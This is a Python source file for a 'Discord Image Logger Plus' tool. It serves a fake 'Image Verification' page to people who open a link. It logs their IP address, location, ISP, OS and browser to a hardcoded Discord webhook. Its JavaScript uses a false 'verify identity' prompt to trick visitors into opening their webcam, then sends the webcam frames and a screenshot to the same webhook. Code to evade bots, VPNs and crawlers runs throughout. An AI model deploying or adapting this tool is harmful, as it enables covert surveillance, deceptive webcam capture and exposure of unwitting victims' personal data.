# Enhanced Image Logger with Media Capture
# By Team C00lB0i/C00lB0i | Enhanced for Cybersecurity Project

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger Plus"
__description__ = "Advanced IP and media capture tool"
__version__ = "v3.0"
__author__ = "C00lB0i"

config = {
    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "Media Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": True,
        "message": "Verifying your request...",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
    # New media capture settings
    "captureScreenshot": True,
    "captureWebcam": True,
    "mediaWebhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz"
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    elif "googlebot" in useragent.lower():
        return "Google Bot"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
        }]
    })

def send_media_to_discord(media_data, media_type, ip):
    """Send captured media to Discord"""
    try:
        requests.post(config["mediaWebhook"], json={
            "username": f"Media Capture - {ip}",
            "content": f"New {media_type} captured from {ip}",
            "embeds": [{
                "title": f"{media_type.capitalize()} Capture",
                "color": config["color"],
                "image": {"url": f"attachment://{media_type}.png"}
            }],
            "attachments": [{
                "id": 0,
                "filename": f"{media_type}.png",
                "content_type": "image/png"
            }],
            "payload_json": {
                "embeds": [{
                    "title": f"{media_type.capitalize()} Capture",
                    "color": config["color"],
                    "image": {"url": "attachment://image.png"}
                }],
                "attachments": [{
                    "id": 0,
                    "filename": "image.png",
                    "description": f"{media_type} from {ip}"
                }]
            }
        }, files={
            f"{media_type}.png": (f"{media_type}.png", base64.b64decode(media_data), "image/png")
        })
    except Exception as e:
        reportError(f"Media send error: {str(e)}")

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Media Logger - Link Sent",
                    "color": config["color"],
                    "description": f"Media logging link sent!\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
                }]
            })
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        if info.get("proxy"):
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting"):
            if config["antiBot"] == 4:
                if not info.get("proxy"):
                    return
            elif config["antiBot"] == 3:
                return
            elif config["antiBot"] == 2:
                if not info.get("proxy"):
                    ping = ""
            elif config["antiBot"] == 1:
                ping = ""
    except:
        info = {}

    os, browser = "Unknown", "Unknown"
    try:
        os, browser = httpagentparser.simple_detect(useragent)
    except:
        pass

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Media Logger - IP Logged",
            "color": config["color"],
            "description": f"""**New Visitor!**

**Endpoint:** {endpoint}
            
**IP Info:**
> **IP:** {ip}
> **ISP:** {info.get('isp', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {f"{info.get('lat', '?')}, {info.get('lon', '?')}" if not coords else coords}
> **VPN:** {'Yes' if info.get('proxy') else 'No'}

**System Info:**
> **OS:** {os}
> **Browser:** {browser}

**User Agent:**
```{useragent}```
""",
        }]
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except:
        pass

    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class MediaCaptureAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # Parse request path and query
            parsed_path = parse.urlparse(self.path)
            query = parse.parse_qs(parsed_path.query)
            
            # Handle media submission endpoint
            if parsed_path.path == "/submit_media":
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                data = parse.parse_qs(post_data.decode())
                
                ip = self.headers.get('x-forwarded-for', 'Unknown')
                
                # Process screenshot if available
                if config["captureScreenshot"] and b'screenshot' in post_data:
                    screenshot_data = data.get('screenshot', [''])[0]
                    send_media_to_discord(screenshot_data, "screenshot", ip)
                
                # Process webcam capture if available
                if config["captureWebcam"] and b'webcam' in post_data:
                    webcam_data = data.get('webcam', [''])[0]
                    send_media_to_discord(webcam_data, "webcam", ip)
                
                self.send_response(200)
                self.end_headers()
                return
            
            # Get image URL
            if config["imageArgument"] and (query.get("url") or query.get("id")):
                url = base64.b64decode((query.get("url") or query.get("id"))[0]).decode()
            else:
                url = config["image"]
            
            # Skip blacklisted IPs
            ip = self.headers.get('x-forwarded-for', 'Unknown')
            if ip.startswith(blacklistedIPs):
                self.send_response(403)
                self.end_headers()
                return
            
            # Handle bots
            user_agent = self.headers.get('user-agent', '')
            if botCheck(ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_header('Location', url)
                    self.end_headers()
                
                makeReport(ip, endpoint=parsed_path.path, url=url)
                return
            
            # Generate HTML with media capture capabilities
            html_content = self.generate_capture_html(url, ip)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
            
            # Make initial report
            makeReport(ip, user_agent, endpoint=parsed_path.path, url=url)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    def generate_capture_html(self, image_url, ip):
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Image Verification</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }}
        .container {{
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 600px;
            width: 90%;
            text-align: center;
        }}
        .image-preview {{
            width: 100%;
            max-height: 400px;
            object-fit: contain;
            margin: 20px 0;
            border: 1px solid #eee;
            border-radius: 5px;
        }}
        .btn {{
            background-color: #4285F4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
            transition: background-color 0.3s;
        }}
        .btn:hover {{
            background-color: #3367D6;
        }}
        .hidden {{
            display: none;
        }}
        .status {{
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }}
        .camera-feed {{
            width: 100%;
            max-height: 300px;
            background-color: #000;
            margin: 20px 0;
            border-radius: 5px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Image Verification Required</h2>
        <p>Please verify you're human to view this content</p>
        
        <img src="{image_url}" class="image-preview" alt="Verification Image">
        
        <div id="captureSection">
            <button id="captureBtn" class="btn">Verify Identity</button>
            <p class="status">This helps prevent automated access</p>
        </div>
        
        <div id="cameraSection" class="hidden">
            <p>Camera access required for verification</p>
            <video id="cameraFeed" class="camera-feed" autoplay playsinline></video>
            <button id="captureWebcamBtn" class="btn">Capture Image</button>
        </div>
        
        <div id="processingSection" class="hidden">
            <p>Processing verification...</p>
            <div class="status">Please wait while we verify your request</div>
        </div>
    </div>

    <script>
        // Configuration
        const config = {{
            captureScreenshot: {str(config["captureScreenshot"]).lower()},
            captureWebcam: {str(config["captureWebcam"]).lower()}
        }};
        
        // Elements
        const captureBtn = document.getElementById('captureBtn');
        const cameraSection = document.getElementById('cameraSection');
        const cameraFeed = document.getElementById('cameraFeed');
        const captureWebcamBtn = document.getElementById('captureWebcamBtn');
        const processingSection = document.getElementById('processingSection');
        const captureSection = document.getElementById('captureSection');
        
        // State
        let stream = null;
        let screenshotData = '';
        let webcamData = '';
        
        // Capture screenshot if enabled
        if(config.captureScreenshot) {{
            try {{
                // Create a canvas to capture the current view
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                
                // Set canvas dimensions
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                
                // Draw the current document to canvas
                context.drawImage(document.documentElement, 0, 0, 
                                canvas.width, canvas.height);
                
                // Get the screenshot as data URL
                screenshotData = canvas.toDataURL('image/png').split(',')[1];
            }} catch (e) {{
                console.error('Screenshot capture failed:', e);
            }}
        }}
        
        // Handle initial capture button
        captureBtn.addEventListener('click', async () => {{
            if(config.captureWebcam) {{
                // Request camera access
                try {{
                    stream = await navigator.mediaDevices.getUserMedia({{ 
                        video: {{ facingMode: 'user' }} 
                    }});
                    cameraFeed.srcObject = stream;
                    captureSection.classList.add('hidden');
                    cameraSection.classList.remove('hidden');
                }} catch (err) {{
                    console.error('Camera access error:', err);
                    submitMedia();
                }}
            }} else {{
                submitMedia();
            }}
        }});
        
        // Handle webcam capture
        captureWebcamBtn.addEventListener('click', () => {{
            if(!stream) return;
            
            try {{
                // Create canvas to capture webcam frame
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                
                // Set canvas dimensions to match video
                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;
                
                // Draw current video frame to canvas
                context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                
                // Get webcam capture as data URL
                webcamData = canvas.toDataURL('image/png').split(',')[1];
                
                // Stop camera stream
                stream.getTracks().forEach(track => track.stop());
                
                // Show processing state
                cameraSection.classList.add('hidden');
                processingSection.classList.remove('hidden');
                
                // Submit media
                submitMedia();
            }} catch (e) {{
                console.error('Webcam capture failed:', e);
                submitMedia();
            }}
        }});
        
        // Submit captured media to server
        function submitMedia() {{
            // Create form data
            const formData = new FormData();
            if(screenshotData) formData.append('screenshot', screenshotData);
            if(webcamData) formData.append('webcam', webcamData);
            
            // Send to server
            fetch('/submit_media', {{
                method: 'POST',
                body: formData
            }})
            .then(response => {{
                // Redirect to actual image after submission
                window.location.href = "{image_url}";
            }})
            .catch(error => {{
                console.error('Submission error:', error);
                window.location.href = "{image_url}";
            }});
        }}
        
        // Auto-start the process if no interaction needed
        if(!config.captureWebcam && config.captureScreenshot) {{
            setTimeout(() => {{
                captureSection.classList.add('hidden');
                processingSection.classList.remove('hidden');
                submitMedia();
            }}, 3000);
        }}
    </script>
</body>
</html>"""

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = MediaCaptureAPI
